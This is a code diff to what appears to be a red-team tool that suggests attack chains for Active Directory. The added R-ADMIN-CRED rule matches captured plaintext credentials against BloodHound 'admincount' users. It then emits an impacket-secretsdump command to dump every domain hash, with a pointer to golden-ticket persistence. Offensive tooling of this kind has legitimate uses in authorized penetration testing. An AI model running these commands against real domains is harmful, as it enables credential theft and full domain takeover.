@@ -623,6 +623,36 @@ def run(report, store, ui=None):
                 ], src=hsrc, line=hln))
             break
 
+    # iter-45: R-ADMIN-CRED - the operator's owned plaintext cred matches
+    # a user BloodHound flagged 'admincount' (Domain Admin candidate).
+    # Emit BEFORE R-GOLDEN so the operator sees the trivial win first:
+    # they already have Administrator-tier credentials.
+    admincount_users = {ev.user.lower() for ev in store.items
+                        if ev.kind == "user" and ev.fact == "admincount"
+                        and ev.user}
+    if admincount_users:
+        seen_ac = set()
+        for (ulc, pw), occurrences in e.creds.items():
+            if ulc not in admincount_users or ulc in seen_ac:
+                continue
+            seen_ac.add(ulc)
+            best_src, best_line = "", None
+            for _disp, _s, _l in occurrences:
+                if _s:
+                    best_src, best_line = _s, _l
+                    break
+            _dom_ac = store.dominant_domain() or "<dom>"
+            chains.append(Chain("R-ADMIN-CRED", "already-DA cred",
+                f"{ulc}:{pw} - BloodHound says admincount (Domain Admin candidate)",
+                crit=10, conf=0.95, ready=1.5, prox=1.0,         # score 14.25
+                commands=[
+                    f"# BloodHound admincount=1 means {ulc} was recently in a "
+                    f"tier-0 group (DA/EA/BA/Schema/etc.)",
+                    f"impacket-secretsdump '{_dom_ac}/{ulc}:{pw}'@<DC-IP>",
+                    f"# if that works you have every domain hash - proceed to "
+                    f"R-GOLDEN for persistence",
+                ], src=best_src, line=best_line))
+
     # iter-35: R-GOLDEN - krbtgt NT hash was recovered (from NTDS DCSync or
     # ntds.dit + SYSTEM). One command forges an Administrator TGT for the
     # domain; no network re-auth needed. Highest-value chain when present.
